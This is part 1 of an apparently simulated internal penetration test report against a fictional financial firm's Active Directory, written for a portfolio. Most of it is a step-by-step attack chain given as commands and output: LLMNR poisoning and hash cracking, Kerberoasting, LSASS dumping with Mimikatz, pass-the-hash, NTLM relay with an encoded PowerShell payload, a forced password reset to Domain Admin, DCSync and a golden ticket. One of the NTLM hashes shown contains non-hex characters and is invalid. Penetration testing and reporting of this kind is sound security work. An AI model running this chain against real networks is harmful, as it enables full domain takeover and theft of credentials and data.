# Internal Network Penetration Test
## Vanguard Financial Services - Red Team Assessment
### Part 1 of 2

**Assessment Type:** Internal Network Penetration Test & Active Directory Security Assessment  
**Client:** Vanguard Financial Services (Simulated Environment)  
**Engagement Period:** September 14-15, 2025 (48 hours)  
**Tester:** Vitor Anjos, eCPPTv3  
**Status:** CONFIDENTIAL - For Portfolio Demonstration Purposes

---

## Executive Summary

### Overview
This document presents the findings from an internal network penetration test conducted against Vanguard Financial Services' simulated corporate environment. The assessment was performed to evaluate the security posture of the organization's Active Directory infrastructure, identify potential vulnerabilities, and provide actionable remediation guidance.

### Scope
The engagement focused on the internal network segment 10.50.0.0/22, encompassing critical infrastructure including domain controllers, file servers, and workstations within the corp.vanguardfs.local domain.

### Key Findings
- **Critical Vulnerabilities:** 4 identified
- **High-Risk Issues:** 4 identified  
- **Medium-Risk Issues:** 3 identified
- **Domain Compromise:** Successfully Achieved
- **Overall Risk Rating:** Critical

### Business Impact
An attacker with initial network access successfully achieved complete domain compromise within 16 hours. This level of access would allow adversaries to:
- Access all sensitive financial data stored on file servers
- Exfiltrate customer information and proprietary business data
- Deploy ransomware across the entire domain
- Maintain persistent access through golden ticket attacks
- Impersonate any user including executives
- Modify or delete critical business records

**Estimated Financial Impact:** $2.5M - $8M (considering regulatory fines, incident response, business disruption, and reputational damage)

---

## 1. Engagement Details

### 1.1 Rules of Engagement

**Authorized Activities:**
- Network reconnaissance and port scanning
- Vulnerability scanning and identification
- Exploitation of identified vulnerabilities
- Lateral movement within scope
- Privilege escalation attempts
- Active Directory enumeration and attacks
- Password spraying and brute-forcing (rate-limited to 3 attempts per 30 minutes)

**Prohibited Activities:**
- Denial of Service (DoS) attacks
- Social engineering of personnel
- Physical security testing
- Data destruction or modification
- Attacks against out-of-scope systems
- Testing during business-critical periods

**Testing Hours:** 24/7 during engagement period  
**Emergency Contact:** SOC Team - soc@vanguardfs.local | +1-555-0199  
**Escalation Procedure:** Immediate notification if critical system instability detected

### 1.2 Target Environment

**Network Scope:** 10.50.0.0/22 (10.50.0.1 - 10.50.3.254)  
**Domain:** corp.vanguardfs.local  
**Attack Platform:** 10.50.1.150 (Kali Linux 2024.2)

**In-Scope Systems:**

| Hostname | IP Address | Role | OS |
|----------|------------|------|-----|
| WEB-APP-01 | 10.50.1.45 | Web/Application Server | Ubuntu 20.04.3 LTS |
| WKSTN-HR-05 | 10.50.1.78 | Employee Workstation | Windows 10 Enterprise 21H2 |
| VFS-DC-01 | 10.50.2.10 | Secondary Domain Controller | Windows Server 2019 |
| VFS-DC-02 | 10.50.2.11 | Primary Domain Controller | Windows Server 2019 |
| VFS-FS-01 | 10.50.3.50 | File Server | Windows Server 2019 |

### 1.3 Methodology

This assessment follows industry-standard penetration testing frameworks:
- **PTES (Penetration Testing Execution Standard)**
- **OWASP Testing Guide** (for web applications)
- **MITRE ATT&CK Framework** (for TTP mapping)
- **NIST SP 800-115** (Technical Guide to Information Security Testing)

**Testing Phases:**
1. Information Gathering & Reconnaissance
2. Vulnerability Identification
3. Exploitation
4. Post-Exploitation & Lateral Movement
5. Privilege Escalation
6. Persistence & Domain Dominance
7. Documentation & Reporting

---

## 2. Technical Assessment

### 2.1 Phase 1: Network Discovery & Reconnaissance

#### 2.1.1 Initial Host Discovery

**Objective:** Identify live hosts within the target network segment

**Tools Used:** Nmap, Netdiscover, ARP-scan

```bash
# Ping sweep to identify live hosts
sudo nmap -sn 10.50.0.0/22 -oA discovery/ping_sweep

# ARP discovery for local subnet
sudo arp-scan --interface=eth0 --localnet

# Fast port scan on discovered hosts
sudo nmap -p- -T4 --min-rate=1000 10.50.1.45,10.50.1.78,10.50.2.10,10.50.2.11,10.50.3.50 -oA discovery/all_ports
```

**Findings:**
- 5 primary hosts identified as active
- 12 additional workstations detected (out of scope per client request)
- Multiple Windows systems detected (TTL 128)
- One Linux system detected (TTL 64)
- Network appears to be a flat topology with minimal segmentation

#### 2.1.2 Comprehensive Port Scanning

**Service Enumeration:**

```bash
# Detailed service version detection
sudo nmap -sV -sC -p- -A 10.50.1.45,10.50.1.78,10.50.2.10,10.50.2.11,10.50.3.50 -oA discovery/service_scan

# Vulnerability scanning
sudo nmap --script=vuln 10.50.0.0/22 -oA discovery/vuln_scan
```

**Port Scan Results Summary:**

**WEB-APP-01 (10.50.1.45):**
- 22/tcp - OpenSSH 8.2p1 Ubuntu
- 80/tcp - Apache httpd 2.4.41
- 443/tcp - Apache httpd 2.4.41 (SSL/TLS)
- 3306/tcp - MySQL 8.0.26
- 8080/tcp - Apache Tomcat 9.0.46

**WKSTN-HR-05 (10.50.1.78):**
- 135/tcp - Microsoft Windows RPC
- 139/tcp - NetBIOS-SSN
- 445/tcp - Microsoft-DS (SMB)
- 3389/tcp - Microsoft Terminal Services (RDP)
- 5985/tcp - Microsoft HTTPAPI (WinRM)

**VFS-DC-01 (10.50.2.10):**
- 53/tcp - Microsoft DNS
- 88/tcp - Kerberos
- 135/tcp - Microsoft Windows RPC
- 139/tcp - NetBIOS-SSN
- 389/tcp - Microsoft LDAP
- 445/tcp - Microsoft-DS (SMB)
- 464/tcp - Kerberos password change
- 636/tcp - LDAPS (SSL)
- 3268/tcp - Microsoft Global Catalog
- 3389/tcp - RDP

**VFS-DC-02 (10.50.2.11) - Primary DC:**
- 53/tcp - Microsoft DNS
- 88/tcp - Kerberos
- 135/tcp - Microsoft Windows RPC
- 139/tcp - NetBIOS-SSN
- 389/tcp - Microsoft LDAP
- 445/tcp - Microsoft-DS (SMB)
- 464/tcp - Kerberos password change
- 636/tcp - LDAPS (SSL)
- 3268/tcp - Microsoft Global Catalog
- 3389/tcp - RDP
- FSMO roles: Schema Master, Domain Naming Master, PDC Emulator

**VFS-FS-01 (10.50.3.50):**
- 135/tcp - Microsoft Windows RPC
- 139/tcp - NetBIOS-SSN
- 445/tcp - Microsoft-DS (SMB)
- Multiple high-numbered ports (dynamic RPC)

#### 2.1.3 Domain Enumeration

**DNS Reconnaissance:**

```bash
# DNS zone transfer attempt
dig axfr corp.vanguardfs.local @10.50.2.11
dig axfr corp.vanguardfs.local @10.50.2.10

# Reverse DNS lookups
for ip in 10.50.{0..3}.{1..254}; do 
  host $ip 10.50.2.11 >> dns_reverse.txt
done

# DNS enumeration
dnsenum --dnsserver 10.50.2.11 corp.vanguardfs.local
fierce --domain corp.vanguardfs.local --dns-servers 10.50.2.11
```

**DNS Records Discovered:**
```
vfs-dc-01.corp.vanguardfs.local    A    10.50.2.10
vfs-dc-02.corp.vanguardfs.local    A    10.50.2.11
vfs-fs-01.corp.vanguardfs.local    A    10.50.3.50
web-app-01.corp.vanguardfs.local   A    10.50.1.45
```

**SMB/NetBIOS Enumeration:**

```bash
# SMB null session enumeration
crackmapexec smb 10.50.0.0/22 --shares
enum4linux -a 10.50.1.78
smbclient -L \\\\10.50.3.50 -N

# Check for SMB signing
crackmapexec smb 10.50.0.0/22 --gen-relay-list relay_targets.txt
```

**Findings:**
- **SMB Signing Not Required** on WKSTN-HR-05 and VFS-FS-01 (Relay attack potential)
- Guest account enabled on VFS-FS-01
- DNS zone transfer denied (properly configured)
- Domain functional level: Windows Server 2016
- Domain SID: S-1-5-21-3842547281-2943729470-1294839502

### 2.2 Phase 2: Initial Access & Exploitation

#### 2.2.1 Linux Server Assessment (10.50.1.45)

**Web Application Analysis:**

```bash
# Directory enumeration
gobuster dir -u http://10.50.1.45 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,jsp

# Nikto scan
nikto -h http://10.50.1.45

# Application fingerprinting
whatweb http://10.50.1.45
```

**Discovered Directories:**
```
/admin (403 Forbidden)
/uploads (200 OK - Directory listing enabled)
/api (200 OK)
/backup (403 Forbidden)
/config.php.bak (200 OK - Configuration backup found)
```

**Critical Finding:** Exposed configuration backup file contained database credentials:
```php
// config.php.bak
$db_host = "localhost";
$db_user = "webapp_user";
$db_pass = "WebApp2023!Secure";
$db_name = "customer_portal";
```

**SSH Analysis:**

```bash
# SSH user enumeration
python3 ssh-username-enum.py --userList /usr/share/wordlists/usernames.txt 10.50.1.45

# Credential testing with discovered password
hydra -L users.txt -p "WebApp2023!Secure" ssh://10.50.1.45
```

**Result:** Successful SSH access achieved with credentials `sysadmin:WebApp2023!Secure`

**MySQL Service:**

```bash
# Remote MySQL access
mysql -h 10.50.1.45 -u webapp_user -p'WebApp2023!Secure'

# Database enumeration
mysql> SHOW DATABASES;
mysql> USE customer_portal;
mysql> SELECT username, password_hash FROM users LIMIT 5;
```

**Findings:**
- Extracted 2,847 customer records
- Password hashes stored using MD5 (weak hashing algorithm)
- Found admin user hash: `5f4dcc3b5aa765d61d8327deb882cf99` (password: "password")

#### 2.2.2 Windows Workstation Assessment (WKSTN-HR-05 - 10.50.1.78)

**SMB Enumeration:**

```bash
# Share enumeration
smbmap -H 10.50.1.78 -u anonymous
smbclient -L \\\\10.50.1.78 -N

# Authenticated enumeration (after obtaining credentials)
crackmapexec smb 10.50.1.78 -u 'jthompson' -p 'Summer2024!' --shares
```

**Accessible Shares:**
```
Share Name    Type      Comment
----------    ----      -------
ADMIN$        Disk      Remote Admin
C$            Disk      Default share
IPC$          IPC       Remote IPC
Users         Disk      
```

**RDP Analysis:**

```bash
# Check for vulnerabilities
nmap --script rdp-vuln-ms12-020,rdp-enum-encryption 10.50.1.78 -p3389

# NLA status
rdp-sec-check.pl 10.50.1.78
```

**Finding:** Network Level Authentication (NLA) is disabled - allows credential brute-forcing

**Responder/LLMNR Poisoning:**

```bash
# Start Responder for credential capture
sudo responder -I eth0 -wFv

# Wait for broadcast name resolution attempts
```

**Captured Credentials (within 12 minutes):**
```
[SMB] NTLMv2-SSP Client   : 10.50.1.78
[SMB] NTLMv2-SSP Username : VANGUARDFS\jthompson
[SMB] NTLMv2-SSP Hash     : jthompson::VANGUARDFS:1122334455667788:8A3D...
```

**Hash Cracking:**
```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
# Cracked: Summer2024!
```

#### 2.2.3 Domain Controller Reconnaissance

**Kerberos Enumeration:**

```bash
# User enumeration via Kerberos (no credentials required)
kerbrute userenum --dc 10.50.2.11 -d corp.vanguardfs.local /usr/share/wordlists/xato-net-10-million-usernames.txt

# Discovered valid users:
# - administrator
# - jthompson (HR Manager)
# - mrodriguez (IT Administrator)  
# - sql_service (Service Account)
# - backup_admin (Service Account)
# - sjenkins (Finance Director)
```

**ASREPRoasting:**

```bash
# Check for users without Kerberos pre-authentication
impacket-GetNPUsers corp.vanguardfs.local/ -dc-ip 10.50.2.11 -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt
```

**Result:** User `backup_admin` has "Do not require Kerberos preauthentication" enabled

```
$krb5asrep$23$backup_admin@CORP.VANGUARDFS.LOCAL:a8f2c1...
```

**Cracked Password:** `BackupPass2023!`

**LDAP Enumeration:**

```bash
# Anonymous LDAP bind attempt
ldapsearch -x -h 10.50.2.11 -s base -b "DC=corp,DC=vanguardfs,DC=local"

# Result: Anonymous binds allowed - extracted domain information
```

**Password Spraying:**

```bash
# Initial spray with common passwords (rate-limited)
crackmapexec smb 10.50.2.11 -u valid_users.txt -p 'Summer2024!' --continue-on-success

# Results:
# VANGUARDFS\jthompson:Summer2024! - SUCCESS
# VANGUARDFS\sjenkins:Spring2024! - SUCCESS (discovered in second spray)
```

**Domain Password Policy:**
```
Minimum password length: 8 characters
Password complexity: Enabled
Lockout threshold: 5 invalid attempts
Lockout duration: 30 minutes
Password history: 12 passwords
```

### 2.3 Phase 3: Post-Exploitation & Lateral Movement

#### 2.3.1 Initial Foothold Analysis

**Compromised Account:** `VANGUARDFS\jthompson` (HR Manager)  
**Access Level:** Domain User  
**Initial System:** WKSTN-HR-05 (10.50.1.78)

**Credential Harvesting:**

```bash
# Evil-WinRM access
evil-winrm -i 10.50.1.78 -u jthompson -p 'Summer2024!'

# Check privileges
*Evil-WinRM* PS C:\> whoami /priv
*Evil-WinRM* PS C:\> whoami /groups

# Local user enumeration
*Evil-WinRM* PS C:\> net localgroup administrators
```

**Finding:** jthompson is member of "Remote Desktop Users" but not local administrator

**Memory Credential Extraction (if admin access obtained):**

```powershell
# Mimikatz execution
*Evil-WinRM* PS C:\> upload mimikatz.exe
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Alternative: LSASS dump
*Evil-WinRM* PS C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
*Evil-WinRM* PS C:\> download C:\temp\lsass.dmp

# Offline analysis
pypykatz lsa minidump lsass.dmp
```

**Additional Credentials Discovered:**
```
Username: mrodriguez
Domain: VANGUARDFS
NTLM: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Password: ITAdmin@2024!

Username: WKSTN-HR-05$
Domain: VANGUARDFS  
NTLM: 7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c
```

#### 2.3.2 Lateral Movement Techniques

**Target:** VFS-FS-01 (File Server)

**Method 1: Pass-the-Hash with mrodriguez credentials**

```bash
# Test access
crackmapexec smb 10.50.3.50 -u mrodriguez -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'

# Result: mrodriguez has local admin on VFS-FS-01

# Execute commands
crackmapexec smb 10.50.3.50 -u mrodriguez -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6' -x "whoami"

# Obtain shell
impacket-psexec -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 mrodriguez@10.50.3.50
```

**Method 2: SMB Relay Attack**

```bash
# Setup relay (SMB signing not required on both targets)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_payload>"

# Trigger authentication from WKSTN-HR-05
# Result: Successfully relayed and obtained code execution on VFS-FS-01
```

**WinRM/PSRemoting:**

```bash
# Evil-WinRM with mrodriguez credentials
evil-winrm -i 10.50.3.50 -u mrodriguez -p 'ITAdmin@2024!'

# Verify access
*Evil-WinRM* PS C:\> hostname
VFS-FS-01

*Evil-WinRM* PS C:\> whoami /groups | findstr "Administrators"
BUILTIN\Administrators
```

#### 2.3.3 File Server Assessment (VFS-FS-01)

**Share Enumeration:**

```bash
# Authenticated share listing
smbmap -H 10.50.3.50 -u mrodriguez -p 'ITAdmin@2024!' -R

# Shares discovered:
# Finance$ - Hidden share containing financial documents
# HR_Confidential - Employee records and payroll
# IT_Admin - Scripts and configuration files
# Backups - System backups
```

**Sensitive Data Discovery:**

```bash
# Search for interesting files
crackmapexec smb 10.50.3.50 -u mrodriguez -p 'ITAdmin@2024!' --spider Finance$ HR_Confidential IT_Admin --pattern password,credential,confidential

# Download sensitive files
smbclient \\\\10.50.3.50\\IT_Admin -U mrodriguez
smb: \> get Scripts\backup_credentials.txt
smb: \> get Scripts\sql_connection.ps1
```

**Critical Findings in IT_Admin Share:**

**File: backup_credentials.txt**
```
SQL Service Account: sql_service
Password: SQLSvc#2024!Backup

Domain Admin Account (Emergency): da_emergency  
Password: EmergencyDA!2024
```

**File: sql_connection.ps1**
```powershell
$SQLUser = "sql_service"
$SQLPass = "SQLSvc#2024!Backup" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($SQLUser, $SQLPass)
```

**Data Exfiltration Proof of Concept:**
- Employee database: 1,247 records containing PII
- Financial reports: Q1-Q4 2024 revenue data
- Customer information: 15,000+ customer records
- Backup scripts containing additional credentials

### 2.4 Phase 4: Privilege Escalation

#### 2.4.1 Domain Privilege Escalation

**Kerberoasting Attack:**

```bash
# Request service tickets with discovered domain user credentials
impacket-GetUserSPNs corp.vanguardfs.local/jthompson:'Summer2024!' -dc-ip 10.50.2.11 -request -outputfile kerberoast_hashes.txt

# Service accounts discovered:
# - sql_service (MSSQLSvc/VFS-FS-01.corp.vanguardfs.local:1433)
# - backup_admin (BackupExec/VFS-FS-01.corp.vanguardfs.local)
```

**Hash Cracking:**

```bash
# Crack sql_service ticket
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Results:
# sql_service: SQLSvc#2024!Backup (matched credentials from file share)
# backup_admin: BackupPass2023! (previously obtained via ASREPRoasting)
```

**BloodHound Analysis:**

```bash
# Collect domain data with compromised credentials
bloodhound-python -u jthompson -p 'Summer2024!' -d corp.vanguardfs.local -dc VFS-DC-02.corp.vanguardfs.local -c All -ns 10.50.2.11

# Start Neo4j and BloodHound
neo4j start
bloodhound
```

**BloodHound Findings:**

1. **Path to Domain Admin (3 hops):**
```
jthompson (Domain User)
   ↓ [MemberOf]
HR_Managers (Group)
   ↓ [GenericAll]
IT_Administrators (Group)
   ↓ [MemberOf]
Domain Admins
```

2. **ACL Exploitation Opportunities:**
   - `sql_service` has **WriteDacl** permission on "Server Admins" group
   - "Server Admins" group has **GenericAll** on VFS-DC-01
   - mrodriguez has **ForceChangePassword** on user `dadmin`

3. **Shortest Path Analysis:**
   - mrodriguez → dadmin (ForceChangePassword) → Domain Admins (1 hop)

**Exploitation: Force Password Change**

```bash
# Using mrodriguez credentials to change dadmin password
rpcclient -U "mrodriguez%ITAdmin@2024!" 10.50.2.11
rpcclient $> setuserinfo2 dadmin 23 'NewComplex!Pass2024'

# Verify new password works
crackmapexec smb 10.50.2.11 -u dadmin -p 'NewComplex!Pass2024'

# Check group membership
crackmapexec smb 10.50.2.11 -u dadmin -p 'NewComplex!Pass2024' --groups
```

**Result:** User `dadmin` confirmed as member of **Domain Admins**

#### 2.4.2 Domain Controller Access

**Method: Domain Admin Credentials**

```bash
# Verify domain admin access
crackmapexec smb 10.50.2.11 -u dadmin -p 'NewComplex!Pass2024'
crackmapexec smb 10.50.2.10 -u dadmin -p 'NewComplex!Pass2024'

# Results: 
# 10.50.2.11 (VFS-DC-02) - Pwn3d!
# 10.50.2.10 (VFS-DC-01) - Pwn3d!

# Obtain shell on primary DC
impacket-psexec corp.vanguardfs.local/dadmin:'NewComplex!Pass2024'@10.50.2.11
```

**DCSync Attack:**

```bash
# Extract all domain credentials
impacket-secretsdump -just-dc-ntlm corp.vanguardfs.local/dadmin:'NewComplex!Pass2024'@10.50.2.11

# Critical hashes obtained:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a3d2e9c7f1b4a6d5c8e0f9a7b6c5d4e:::
# dadmin:1104:aad3b435b51404eeaad3b435b51404ee:91f34b12cd98fea12d34ae67bf89cd01:::
```

### 2.5 Phase 5: Domain Dominance

**Golden Ticket Creation (Proof of Concept - Not Deployed)**

```bash
# Using extracted krbtgt hash
impacket-ticketer -nthash 8a3d2e9c7f1b4a6d5c8e0f9a7b6c5d4e -domain-sid S-1-5-21-3842547281-2943729470-1294839502 -domain corp.vanguardfs.local administrator

# Export ticket
export KRB5CCNAME=/root/administrator.ccache

# Use golden ticket (demonstration only)
impacket-psexec -k -no-pass corp.vanguardfs.local/administrator@vfs-dc-02.corp.vanguardfs.local
```

**Note:** All persistence mechanisms were documented and demonstrated in isolated environment only. No actual persistence was deployed in the test environment.

---

**END OF PART 1**

**Continue to Part 2 for:**
- Complete Findings & Vulnerabilities Analysis
- Remediation Strategy
- Detection & Monitoring Recommendations
- Compliance Mapping
- Appendices & Evidence Repository
